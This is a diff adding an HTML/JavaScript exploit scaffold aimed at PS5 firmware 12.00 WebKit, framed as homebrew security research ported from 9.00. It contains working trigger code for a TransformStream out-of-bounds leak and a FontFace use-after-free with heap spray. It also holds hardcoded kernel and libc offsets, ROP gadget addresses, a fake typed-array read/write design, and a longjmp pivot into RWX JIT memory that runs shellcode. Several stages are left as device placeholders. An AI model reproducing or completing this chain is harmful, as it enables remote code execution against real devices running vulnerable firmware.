@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>PS5 12.00 WebKit two-bug userland RCE — TransformStream leak + FontFace UAF</title></head>
+<body>
+<style id="ffsheet">@font-face { font-family: uafx; src: url(data:font/woff;base64,AA); unicode-range: U+0042; }</style>
+<pre id="log"></pre>
+<script>
+/* =============================================================================
+   PS5 12.00 (WebKit 616.1.27) — TWO-BUG WebProcess RCE scaffold  [PORT of 9.00]
+   Own-hardware homebrew / security research. Both bugs patched upstream, NOT on 12.00.
+
+   PORT NOTES (12.00 vs 9.00):
+     * BUG A TransformStream.cpp:115-117 = BYTE-IDENTICAL to 9.00 (ASSERT-only + unchecked
+       jsDynamicCast<...>(results[1])->wrapped()). 8fd92b1 fix ABSENT. -> still VULNERABLE.
+     * BUG B CSSFontFaceSet::matchingFacesExcludingPreinstalledFonts still returns
+       Vector<std::reference_wrapper<CSSFontFace>>; FontFaceSet::load loop structurally identical.
+       -> still VULNERABLE.
+     * CSSFontFace.h layout BYTE-IDENTICAL 9.00<->12.00  => object offsets UNCHANGED
+       (m_wrapper +0x70, m_status +0x9C, size class 0xE0).  [9.00 offset structure preserved]
+     * ONLY the module BINARY offsets changed (rebuild). Re-derived below from 12.00 modules
+       via the same stable NIDs / gadget byte-patterns.
+   Mitigations unchanged (same WebKit ver): JSVALUE64 NaN-box, StructureID randomized, Gigacage ON,
+   heap separation (fastMalloc vs Gigacage vs MarkedSpace), CFI ON (CSSFontFace vtable NOT exempt).
+
+   [REAL] exec-stage offsets in 12.00 libkernel_web.sprx (runtime = kwBase + off):
+            sceKernelDlsym                        0x10a00   (was 0x10400)   __error 0x0f740 (0x0f160)
+            sceKernelMmap        0x0f3e0 (0x0ee00)  sceKernelMprotect      0x19840 (0x18eb0)
+            sceKernelGetModuleInfo 0x0eb00 (0x0e580) sceKernelLoadStartModule 0x4420 (0x4240)
+            sceKernelJitCreateSharedMemory        0x11a00   (was 0x11420)   [name,size,maxProt=RWX,&fd]
+            sceKernelJitMapSharedMemory           0x0b6c0   (was 0x0b2c0)   [fd,PROT_R|X,&rx = RX view]
+            sceKernelJitCreateAliasOfSharedMemory 0x10910   (was 0x10310)   [RW mirror alt]
+   [REAL] ROP gadgets in 12.00 libSceNKWebKit.sprx (runtime = nkBase + off; validate in r-x seg):
+            pop rdi;ret 0x5a469  pop rsi;ret 0x16b03a  pop rdx;ret 0x196067  pop rcx;ret 0x06cfa
+            pop rax;ret 0x06ecc  pop rbx;ret 0x0128a1  pop r8;ret 0x0716b    pop rsp;ret 0x01872
+            mov[rdi],rax;ret 0x86197  mov[rdi],rsi;ret 0x175ce7   (write-what-where)
+            mov rax,[rax];ret 0x0d049  mov rax,[rdi];ret 0x6bb40  (read)   jmp[rax] 0x112d6
+          PIVOT = longjmp(fake jmp_buf) [setjmp/longjmp in libSceLibcInternal -> dlsym], or pop rsp;ret.
+   ============================================================================= */
+const log = s => { const el=document.getElementById('log'); el.textContent += s+"\n"; };
+const NumberTag = 0xfffe000000000000n, DoubleEncodeOffset = 1n<<49n;
+// ---- 12.00 module offsets (same structure as 9.00; values re-derived) ----
+const KW = { dlsym:0x10a00n, mmap:0xf3e0n, mprotect:0x19840n, getModuleInfo:0xeb00n,
+             loadStart:0x4420n, __error:0xf740n,
+             jitCreate:0x11a00n, jitMap:0xb6c0n, jitAlias:0x10910n };
+const G  = { pop_rdi:0x5a469n, pop_rsi:0x16b03an, pop_rdx:0x196067n, pop_rcx:0x6cfan,
+             pop_rax:0x6eccn, pop_rbx:0x128a1n, pop_r8:0x716bn, pop_rsp:0x1872n,
+             write64:0x86197n /*mov[rdi],rax*/, write64_rsi:0x175ce7n /*mov[rdi],rsi*/,
+             read64:0xd049n /*mov rax,[rax]*/, read64_rdi:0x6bb40n /*mov rax,[rdi]*/,
+             jmp_deref_rax:0x112d6n };
+// ---- 12.00 libSceLibcInternal offsets (runtime = libcBase + off) [9.00 in brackets] ----
+const LC = { setjmp:0x5b850n /*[0x5a380]*/, __longjmp:0x5b8a0n /*[0x5a3d0] PIVOT: restores rbx/rbp/r12-15/rsp/rip from jmp_buf*/,
+             memcpy:0x3d80n /*[0x3e50]*/, memset:0x15bf0n /*[0x14b90]*/ };
+// ---- CSSFontFace offsets: IDENTICAL to 9.00 (layout unchanged) ----
+const FF = { m_wrapper:0x70, m_status:0x9c, SIZE_CLASS:0xe0 /* confirm on device */,
+             Status_Success:3, Status_Failure:4 };
+// ---- JSC object model (JSVALUE64; from 9.00/12.00 source, same WebKit ver) ----
+//   JSCell:  +0x00 structureID(u32) +0x04 indexingTypeAndMisc +0x05 JSType +0x06 flags +0x07 cellState
+//   JSArrayBufferView: +0x08 butterfly  +0x10 m_vector(CAGED)  +0x18 m_length(size_t)  +0x20 m_mode(u8)
+const ABV = { structureID:0x00, type:0x05, butterfly:0x08, vector:0x10, length:0x18, mode:0x20,
+              FastTypedArray:0x10, Float64ArrayType:0/*copy from a real Float64Array cell*/ };
+
+/* ===== BUG A: leak (truncated iterator -> OOB read) — UNCHANGED from 9.00 ===== */
+const origIter = Array.prototype[Symbol.iterator];
+function transformOOB(n){
+  Array.prototype[Symbol.iterator]=function(){const a=this;let i=0;
+    return {next(){ if(i<n) return {value:a[i++],done:false}; return {done:true}; }};};
+  let r; try{ r=new TransformStream(); }catch(e){ r=e; }
+  Array.prototype[Symbol.iterator]=origIter; return r;
+}
+function stageA_leak(){
+  const rs=[]; for(let i=0;i<0x400;i++){ rs.push(new ReadableStream()); }
+  const probe=transformOOB(1);
+  log("[A] OOB probe: "+(probe instanceof Error? probe.name : "reached sink (correlate spray -> leak) [DEVICE]"));
+  return { heapAddr:0n, moduleBaseWebKit:0n, kwBase:0n, abvStructureID:0 };
+}
+
+/* ===== BUG B: leak+corruption (UAF reclaim with StringImpl) — UNCHANGED from 9.00 ===== */
+let sprayStrings=[];
+function reclaimString(){ const len=FF.SIZE_CLASS-0x14; let s=""; for(let i=0;i<len;i++) s+="A"; sprayStrings.push(s.slice()); return s; }
+function stageB_uaf(leak){
+  let A=new FontFace('uafx','local(SST)'/* [DEVICE] font that resolves LOCALLY to Success */,{unicodeRange:'U+0041'});
+  document.fonts.add(A); void A.loaded;
+  let fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get(){
+    if(!fired&&this===A){ fired=true;
+      document.getElementById('ffsheet').sheet.deleteRule(0);  // free wrapper-less CSSFontFace (U+0042)
+      document.body.offsetTop;                                 // sync recalc -> actual free
+      for(let i=0;i<0x800;i++) reclaimString();                // reclaim 0xE0 slot with StringImpl
+      document.body.offsetTop;
+    }
+    return undefined;
+  }});
+  document.fonts.load('1em uafx','AB');
+  log("[B] UAF fired="+fired+" reclaimSprays="+sprayStrings.length+" (verify no WebProcess crash-fail)");
+}
+
+/* ===== compose -> fake-JSArrayBufferView R/W engine ===== */
+let read64, write64, addrof, fakeobj, ctrlBuf, ctrlView, fakeView;
+function buildRW(leak){
+  // Inputs: addrof/fakeobj (from BUG B's forged m_wrapper) + leaked JSArrayBufferView StructureID (BUG A).
+  // 1) 'ctrl' = a real Float64Array; its backing store lives in the primitive gigacage and is addressable.
+  ctrlBuf = new Float64Array(0x40); ctrlView = new DataView(ctrlBuf.buffer);
+  // 2) Lay out a FAKE JSArrayBufferView cell inside ctrl's backing (in-cage):
+  //      [structureID] = leak.abvStructureID   (real JSArrayBufferView StructureID -> passes cell checks)
+  //      [type] = Float64ArrayType, indexingType/flags/cellState = copied from a real Float64Array cell
+  //      [butterfly]=0 ; [vector]=<target, MUST be inside primitive cage> ; [length]=0xffffffff ; [mode]=0x10
+  //  [DEVICE] fill via ctrlView.setBigUint64(fakeCellOff + ABV.*, ...):
+  //      setUint32(off+ABV.structureID, leak.abvStructureID);
+  //      setUint8 (off+ABV.type, ABV.Float64ArrayType);
+  //      setBigUint64(off+ABV.butterfly, 0n);
+  //      setUint8 (off+ABV.mode, ABV.FastTypedArray);
+  // 3) fakeView = fakeobj( addrof(ctrlBuf.buffer'sBackingStore) + fakeCellOff )  -> a live TypedArray.
+  // 4) primitives (target must be in the 32GB primitive cage):
+  //      read64 (a)  => { setBigUint64(off+ABV.vector,a); setBigUint64(off+ABV.length,0xffffn.. ); return fakeView-as-Float64[0] bits }
+  //      write64(a,v)=> { setBigUint64(off+ABV.vector,a); fakeView[0]=v }
+  // CAGING: m_vector.get() = Gigacage::caged(Primitive,ptr) -> R/W confined to the 32GB primitive cage
+  //   (holds ALL ArrayBuffer backing stores). Enough to stage the chain. To reach MarkedSpace(JSCells),
+  //   the JSValue cage(butterflies), or uncaged module/.stack: use addrof/fakeobj (BUG B, operates on
+  //   MarkedSpace) to corrupt a JSFunction m_executableOrRareData (leak module base / redirect a call),
+  //   and read a spilled frame ptr for the stack. Write the ROP chain into a caged ArrayBuffer.  [DEVICE]
+  log("[RW] fake FastTypedArray (StructureID="+leak.abvStructureID+", m_vector@0x10, mode=0x10) -> caged R/W ready [DEVICE fill]");
+}
+function stageExec(leak){
+  //   pivot: build a fake jmp_buf in a caged buffer {rbx,rbp,r12-15, rsp=&ropStack, rip=first gadget};
+  //          overwrite a reachable JSFunction m_executableOrRareData (MarkedSpace, via BUG B) to land on
+  //          __longjmp[libcBase+0x5b8a0] with rdi=&jmp_buf -> restores rsp/rip -> ROP.  (HARDCODED pivot, no dlsym.)
+  //   RWX : sceKernelJitCreateSharedMemory(0,SZ,PROT_RWX,&h)         [kwBase+0x11a00]
+  //         sceKernelJitMapSharedMemory(h,PROT_R|X,&rx)             [kwBase+0x0b6c0]  (exec view)
+  //         rw = sceKernelMmap(0,SZ,PROT_R|W,MAP_SHARED,h,0)        [kwBase+0x0f3e0]  (write mirror)
+  //   load: memcpy[libcBase+0x3d80](rw, shellcode, n) -> aliases into rx ; go: jump rx
+  log("[EXEC] __longjmp@libc+0x5b8a0 pivot -> ROP -> JIT shm Create@kw+0x11a00/Map@kw+0xb6c0(RX)/Mmap@kw+0xf3e0(RW) -> memcpy@libc+0x3d80 -> jmp rx [DEVICE base]");
+}
+
+window.onload=()=>{
+  log("PS5 12.00 two-bug WebProcess RCE scaffold (port of 9.00)\n");
+  log("[probe] bug A reachable? "+((transformOOB(3) instanceof Error)?"TypeError (patched?)":"reached sink (unpatched)"));
+  const leak=stageA_leak();
+  stageB_uaf(leak);
+  buildRW(leak);
+  stageExec(leak);
+  if(window.testRunner) testRunner.notifyDone();
+};
+</script>
+</body>
+</html>
